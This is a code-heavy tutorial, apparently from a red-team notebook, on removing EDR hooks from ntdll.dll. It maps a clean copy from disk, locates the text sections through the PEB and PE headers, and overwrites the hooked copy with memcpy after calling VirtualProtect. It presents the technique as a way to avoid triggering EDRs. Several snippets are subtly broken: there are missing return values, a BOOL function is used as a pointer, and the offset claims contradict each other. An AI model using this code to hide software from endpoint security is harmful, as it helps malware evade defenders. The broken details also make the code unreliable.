# NTDLL Unhooking - From Disk

## Introduction

REMINDER: When a DLL is read from disk the offset will be 0x400 (1024).&#x20;

<mark style="color:yellow;">**Tl;DR**</mark> Mapping an image into memory rather than reading from disk is more reliable and preferred method.



## Reading NTDLL

The first step is to read NTDLL from disk (C:\Windows\System32\ntdll.dll). There are two methods we can use to do this.&#x20;

* ReadFile (Reads file from disk - 1024 offset)
* CreateFileMapping & MapViewOfFile - (4096 offset MUST include`SEC_IMAGE` or `SEC_IMAGE_NO_EXECUTE` flags in `CreateFileMappingA)` or offset remains 1024.

I'm not going to include a ReadFile example.&#x20;

## Mapping NTDLL

Something worth noting: SEC\_IMAGE\_NO\_EXECUTE does not trigger [PsSetLoadImageNotifyRoutine](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetloadimagenotifyroutine) callback. Using this will not trigger EDRs.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### CreateFileMappingW & MapViewOfFile

```c
BOOL MapNtdllFromDisk() {
    HANDLE hFile = NULL;
    HANDLE hMappingFile = NULL;

    hFile = CreateFileW(ntdllFullPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"CreateFileW Failed %d\n", GetLastError());
        return FALSE;
    }
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE) {
        wprintf(L"GetFileSize Failed %d\n", GetLastError());
        return FALSE;
    }
    // Use SEC_IMAGE_NO_EXECUTE (needed for offset & not to trigger callback)
    hMappingFile = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, (LPCWSTR)NULL);
    if (!hMappingFile) {
        wprintf(L"CreateFileMappingW Failed: %d\n", GetLastError());
        return FALSE;
    }

    LPVOID lpBuffer = MapViewOfFile(hMappingFile, FILE_MAP_READ | FILE_MAP_COPY, 0, 0, 0);
    if (lpBuffer == NULL) {
        wprintf(L"MapViewOfFile Failed: %d\n", GetLastError());
        return FALSE;
    }

    wprintf(L"lpBuffer: %p\n", lpBuffer);
}
```

####

### Reading vs Mapping NTDLL

Sometimes when the `ntdll.dll` file is read from disk rather than mapped to memory, the offset of its text section might be 4096 instead of the expected 1024.&#x20;

Mapping the `ntdll.dll` file to memory is <mark style="color:yellow;">more reliable since the text section offset will always equal the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`IMAGE_SECTION_HEADER.VirtualAddress`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">offset of the DLL file</mark>.



## Unhooking NTDLL



### 1.) Get NTDLL Base Address

There are multiple ways to get a local NTDLL base address. Here is the best way:

* InMemoryOrder.Flink->Flink is a pointer to the second entry in the linked list. This is `ntdll.dll`, the first entry is the running process (unhooking\_ntdll.exe).
* InMemoryOrder.Flink->Flink actually points to the <mark style="color:yellow;">END</mark> of the entry rather than the beginning. The size of the LIST\_ENTRY structure is 0x10, therefore we subtract 0x10 to move the pointer to the beginning.

```c
PVOID FetchLocalNtdllAddress() {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
    return pLdr->DllBase;
}
```

Alternatively, you can use GetModuleHandle() but is a worse approach than above.

### 2.) Fetching The Local NTDLL.DLL Text Section

Getting NTDLL.DLL Text section is easy as getting `BaseOfCode` & `SizeOfCode` from `PIMAGE_OPTIONAL_HEADER`

```c
BOOL FetchLocalTextSectionNtdll(PVOID pBaseAddress) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBaseAddress;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBaseAddress + pDosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&pNtHeaders->OptionalHeader;

    DWORD dwSizeOfText = pOptionalHeader->SizeOfCode;
    PVOID pAddressOfText = pBaseAddress + pOptionalHeader->BaseOfCode;

}

```

Alternatively, you can iterate pNtHeaders->FileHeader.NumberOfSections and search .text.&#x20;



### 3.) Fetching the Unhooked NTDLL.DLL Text Section

We can use our mapping function we created earlier to get the base address of the unhooked ntdll.dll .text section.

We then simply add the base address with the offset (4096 for mapping, 1024 for ReadFile).

```c
ULONG_PTR pUnhookedTxtNtdll = (ULONG_PTR)(MapNtdllFromDisk()) + 4096; // or IMAGE_SECTION_HEADER.VirtualAddress of ntdll.dll
```



### 4.) .Text Section Replacement

We now have everything we need. We can now swap the text section of the unhooked ntdll with the hooked using **memcpy**.

Before we swap we need to change permissions via `VirtualProtect` WinAPI by setting the `PAGE_EXECUTE_WRITECOPY` or `PAGE_EXECUTE_READWRITE` flags.&#x20;

After we've copied the text section we will change back to original permissions.

```c
BOOL SwapNtdllTextSections(IN PVOID pLocalNtdll, IN PVOID pUnhookedNtdll, IN DWORD dwSizeOfText) {
    wprintf(L"Local NTDLL: %p\nUnhooked NTDLL: %p\nSize of Text: %d\n", pLocalNtdll, pUnhookedNtdll, dwSizeOfText);
    // Update Local NTDLL Memory Permissions to RWX Access (Currently only RX)
    DWORD dwOldPermissions = 0;
    if (!VirtualProtect(pLocalNtdll, dwSizeOfText, PAGE_EXECUTE_WRITECOPY, &dwOldPermissions)) {
        wprintf(L"VirtualProtect Failed %d", GetLastError());
        return FALSE;
    }
    getchar();
    // Copy Memory from Unhooked to Local
    memcpy(pLocalNtdll, pUnhookedNtdll, dwSizeOfText);

    if (!VirtualProtect(pLocalNtdll, dwSizeOfText, dwOldPermissions, NULL)) {
        wprintf(L"VirtualProtect Failed %d", GetLastError());
        return FALSE;
    }
    return TRUE;
}
```
